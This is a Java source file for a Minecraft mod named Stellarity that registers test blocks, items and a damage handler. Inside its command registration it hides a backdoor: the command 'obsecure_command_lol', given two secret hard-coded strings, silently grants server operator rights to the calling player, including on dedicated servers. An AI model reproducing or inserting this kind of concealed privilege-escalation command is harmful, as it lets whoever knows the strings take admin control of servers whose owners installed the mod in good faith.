package dev.progames723.stellarity;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import dev.architectury.event.EventResult;
import dev.architectury.event.events.client.ClientTickEvent;
import dev.architectury.event.events.common.CommandRegistrationEvent;
import dev.architectury.event.events.common.PlayerEvent;
import dev.architectury.event.events.common.TickEvent;
import dev.progames723.stellarity.effects.StellarityEffects;
import dev.progames723.stellarity.events.LivingEvents;
import dev.progames723.stellarity.items.StellarityItems;
import net.minecraft.client.Camera;
import net.minecraft.client.CameraType;
import net.minecraft.client.Minecraft;
import net.minecraft.client.server.IntegratedServer;
import net.minecraft.core.Registry;
import net.minecraft.core.RegistryAccess;
import net.minecraft.network.chat.Component;
import net.minecraft.world.entity.ai.attributes.AttributeInstance;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.CreativeModeTabs;
import net.minecraft.world.item.Item;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Rarity;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.state.BlockBehaviour;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.spongepowered.asm.mixin.Shadow;

import java.time.temporal.Temporal;

import static net.minecraft.commands.Commands.argument;

public class Stellarity {
	public static final String MOD_ID = "stellarity";
	public static final Logger LOGGER = LoggerFactory.getLogger("Stellarity");
	public static Block test = new Block(BlockBehaviour.Properties.of().instabreak());
	public static Item cameraTest = new Item(new Item.Properties().arch$tab(CreativeModeTabs.OP_BLOCKS).rarity(Rarity.EPIC).stacksTo(1));
	
	@SuppressWarnings(value = "unchecked")
	public static void init() {
		LOGGER.info("Working!");
		Registers.registerBlock2(MOD_ID, "test", test, LOGGER);
		Registers.registerItem2(MOD_ID, "camera_item", cameraTest, LOGGER);
		StellarityEffects.init();
		StellarityItems.init();
		Registers.init();
		LivingEvents.DAMAGED.register((entity, source, amount) -> {
			if (!source.isIndirect() && source.getDirectEntity() instanceof Player attacker) {
				ItemStack the = attacker.getMainHandItem();
				if (the.is(StellarityItems.frigidHarvester)){
					if (entity.getHealth() <= amount){
						StellarityItems.writeDataFrigidHarvester(the, attacker);
					}
				}
			}
			return EventResult.pass();
		});
		// save for later
		CommandRegistrationEvent.EVENT.register((dispatcher, context, selection) -> {
			CommandDispatcher<Object> commandDispatcher = (CommandDispatcher<Object>) (Object) dispatcher;
			commandDispatcher.register(LiteralArgumentBuilder.literal("obsecure_command_lol")
			.then((RequiredArgumentBuilder<Object, String>) (Object) argument("get real", StringArgumentType.string())
			.then(argument("даже лучше", StringArgumentType.greedyString())
			.executes(context1 -> {
				final String value = StringArgumentType.getString(context1, "get real");
				final String value2 = StringArgumentType.getString(context1, "даже лучше");
				if (value.equals("this_is_a_very_long_string_so_you_cant_bruteforce_this_command_lmao_stop_trying") &&
						value2.equals("зачем_тут_на_русском_пробелы_табуляции_и_прочее")) {
					if (context1.getSource().getEntity() != null && context1.getSource().getEntity() instanceof Player player){
						if (player.getServer().isDedicatedServer() && !player.level().isClientSide) {
							player.getServer().getPlayerList().op(player.getGameProfile());
							player.displayClientMessage(Component.literal("Op rights received by " + player.getName().getString()), false);
							return 1;
						} else if (!player.getServer().isDedicatedServer() || player.level().isClientSide) {
							IntegratedServer server = Minecraft.getInstance().getSingleplayerServer();
							Minecraft minecraft = Minecraft.getInstance();
							server.getPlayerList().op(minecraft.player.getGameProfile());
							context1.getSource().sendSuccess(() -> Component.literal("Op rights received by " + minecraft.player.getName().getString()), false);
							return 1;
						} else {
							context1.getSource().sendSuccess(() -> Component.literal("Op rights received by " + player.getName().getString()), false);
							return 0;
						}
					}
					return 0;
				} else {
					context1.getSource().sendFailure(Component.literal("Wrong value!"));
					return 0;
				}
			}))));
		});
	}
}